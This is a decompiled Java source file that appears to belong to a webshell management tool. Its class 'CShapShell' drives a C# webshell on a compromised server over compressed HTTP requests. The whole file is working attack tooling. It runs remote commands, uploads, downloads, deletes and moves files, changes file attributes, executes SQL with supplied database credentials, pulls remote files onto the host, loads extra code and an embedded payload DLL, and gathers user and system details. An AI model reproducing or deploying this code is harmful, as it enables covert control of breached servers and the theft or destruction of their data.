/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.payloads.csharp;

import core.Encoding;
import core.annotation.PayloadAnnotation;
import core.imp.Payload;
import core.shell.ShellEntity;
import java.io.InputStream;
import java.util.HashMap;
import java.util.Map;
import util.Log;
import util.functions;
import util.http.Http;
import util.http.ReqParameter;

@PayloadAnnotation(Name="CShapDynamicPayload")
public class CShapShell
implements Payload {
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser|ProcessArch|TempDirectory) : (.+)";
    private static final String[] ALL_DATABASE_TYPE = new String[]{"sqlserver"};
    private ShellEntity shell;
    private Http http;
    private Encoding encoding;
    private String fileRoot;
    private String currentDir;
    private String currentUser;
    private String osInfo;
    private String basicsInfo;
    private String processArch;
    private String tempDirectory;
    private boolean isAlive;

    @Override
    public void init(ShellEntity shellContext) {
        this.shell = shellContext;
        this.http = this.shell.getHttp();
        this.encoding = Encoding.getEncoding(this.shell);
    }

    @Override
    public String getFile(String filePath) {
        ReqParameter parameters = new ReqParameter();
        parameters.add("dirName", this.encoding.Encoding(filePath.length() > 0 ? filePath : " "));
        return this.encoding.Decoding(this.evalFunc(null, "getFile", parameters));
    }

    @Override
    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "readFile", parameter);
        return result;
    }

    @Override
    public String getBasicsInfo() {
        if (this.basicsInfo == null) {
            ReqParameter parameter = new ReqParameter();
            this.basicsInfo = this.encoding.Decoding(this.evalFunc(null, "getBasicsInfo", parameter));
        }
        HashMap<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, BASICINFO_REGEX);
        this.fileRoot = (String)pxMap.get("FileRoot");
        this.currentDir = (String)pxMap.get("CurrentDir");
        this.currentUser = (String)pxMap.get("CurrentUser");
        this.osInfo = (String)pxMap.get("OsInfo");
        this.processArch = (String)pxMap.get("ProcessArch");
        this.tempDirectory = (String)pxMap.get("TempDirectory");
        return this.basicsInfo;
    }

    @Override
    public boolean include(String codeName, byte[] binCode) {
        ReqParameter parameters = new ReqParameter();
        parameters.add("codeName", codeName);
        parameters.add("binCode", binCode);
        byte[] result = this.evalFunc(null, "include", parameters);
        String resultString = new String(result).trim();
        if (resultString.equals("ok")) {
            return true;
        }
        Log.error(resultString);
        return false;
    }

    @Override
    public void fillParameter(String className, String funcName, ReqParameter parameter) {
        if (className != null && className.trim().length() > 0) {
            parameter.add("evalClassName", className);
        }
        parameter.add("methodName", funcName);
    }

    @Override
    public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
        this.fillParameter(className, funcName, parameter);
        byte[] data = parameter.formatEx();
        data = functions.gzipE(data);
        return functions.gzipD(this.http.sendHttpResponse(data).getResult());
    }

    @Override
    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        byte[] result = this.evalFunc(null, "uploadFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override
    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc(null, "copyFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override
    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "deleteFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override
    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "newFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override
    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "newDir", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        }
        Log.error(stateString);
        return false;
    }

    @Override
    public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, Map options, String execSql) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dbType", dbType);
        parameter.add("dbHost", dbHost);
        parameter.add("dbPort", Integer.toString(dbPort));
        parameter.add("dbUsername", dbUsername);
        parameter.add("dbPassword", dbPassword);
        parameter.add("execType", execType);
        parameter.add("execSql", this.shell.getDbEncodingModule().Encoding(execSql));
        if (options != null) {
            String dbCharset = (String)options.get("dbCharset");
            String currentDb = (String)options.get("currentDb");
            if (dbCharset != null) {
                parameter.add("dbCharset", dbCharset);
                parameter.add("execSql", Encoding.getEncoding(dbCharset).Encoding(execSql));
            }
            if (currentDb != null) {
                parameter.add("currentDb", currentDb);
            }
        }
        byte[] result = this.evalFunc(null, "execSql", parameter);
        return this.encoding.Decoding(result);
    }

    @Override
    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        }
        this.getBasicsInfo();
        return functions.formatDir(this.currentDir);
    }

    @Override
    public boolean test() {
        ReqParameter parameter = new ReqParameter();
        byte[] result = this.evalFunc(null, "test", parameter);
        String codeString = new String(result);
        if (codeString.trim().equals("ok")) {
            this.isAlive = true;
            return true;
        }
        Log.error(codeString);
        return false;
    }

    @Override
    public String currentUserName() {
        if (this.currentUser != null) {
            return this.currentUser;
        }
        this.getBasicsInfo();
        return this.currentUser;
    }

    @Override
    public String bigFileUpload(String fileName, int position, byte[] content) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileContents", content);
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("position", String.valueOf(position));
        byte[] result = this.evalFunc(null, "bigFileUpload", reqParameter);
        return this.encoding.Decoding(result);
    }

    @Override
    public String getTempDirectory() {
        if (this.tempDirectory != null) {
            return this.tempDirectory;
        }
        if (this.isWindows()) {
            return "c:/windows/temp/";
        }
        return "/tmp/";
    }

    @Override
    public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("position", String.valueOf(position));
        reqParameter.add("readByteNum", String.valueOf(readByteNum));
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("mode", "read");
        return this.evalFunc(null, "bigFileDownload", reqParameter);
    }

    @Override
    public int getFileSize(String fileName) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("fileName", this.encoding.Encoding(fileName));
        reqParameter.add("mode", "fileSize");
        byte[] result = this.evalFunc(null, "bigFileDownload", reqParameter);
        String ret = this.encoding.Decoding(result);
        try {
            return Integer.parseInt(ret);
        } catch (Exception e) {
            Log.error(e);
            Log.error(ret);
            return -1;
        }
    }

    @Override
    public boolean isWindows() {
        return this.currentDir().charAt(0) != '/';
    }

    @Override
    public boolean isAlive() {
        return this.isAlive;
    }

    @Override
    public boolean isX64() {
        return this.processArch.contains("64");
    }

    @Override
    public String[] listFileRoot() {
        if (this.fileRoot != null) {
            return this.fileRoot.split(";");
        }
        this.getBasicsInfo();
        return this.fileRoot.split(";");
    }

    @Override
    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        String[] commandArgs = functions.SplitArgs(commandStr);
        for (int i = 0; i < commandArgs.length; ++i) {
            parameter.add(String.format("arg-%d", i), this.encoding.Encoding(commandArgs[i]));
        }
        parameter.add("argsCount", String.valueOf(commandArgs.length));
        String[] executableArgs = functions.SplitArgs(commandStr, 1, false);
        if (executableArgs.length > 0) {
            parameter.add("executableFile", executableArgs[0]);
            if (executableArgs.length >= 2) {
                parameter.add("executableArgs", executableArgs[1]);
            }
        }
        byte[] result = this.evalFunc(null, "execCommand", parameter);
        return this.encoding.Decoding(result);
    }

    @Override
    public String getOsInfo() {
        if (this.osInfo != null) {
            return this.osInfo;
        }
        this.getBasicsInfo();
        return this.osInfo;
    }

    @Override
    public String[] getAllDatabaseType() {
        return ALL_DATABASE_TYPE;
    }

    @Override
    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc(null, "moveFile", parameter);
        String stasteString = this.encoding.Decoding(result);
        if ("ok".equals(stasteString)) {
            return true;
        }
        Log.error(stasteString);
        return false;
    }

    @Override
    public byte[] getPayload() {
        byte[] data = null;
        try {
            InputStream fileInputStream = CShapShell.class.getResourceAsStream("assets/payload.dll");
            data = functions.readInputStream(fileInputStream);
            fileInputStream.close();
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }

    @Override
    public boolean fileRemoteDown(String url, String saveFile) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("url", this.encoding.Encoding(url));
        reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
        String result = this.encoding.Decoding(this.evalFunc(null, "fileRemoteDown", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }

    @Override
    public boolean setFileAttr(String file, String type, String fileAttr) {
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("type", type);
        reqParameter.add("fileName", this.encoding.Encoding(file));
        reqParameter.add("attr", fileAttr);
        String result = this.encoding.Decoding(this.evalFunc(null, "setFileAttr", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }

    @Override
    public boolean close() {
        this.isAlive = false;
        ReqParameter reqParameter = new ReqParameter();
        String result = this.encoding.Decoding(this.evalFunc(null, "close", reqParameter));
        if ("ok".equals(result)) {
            return true;
        }
        Log.error(result);
        return false;
    }
}

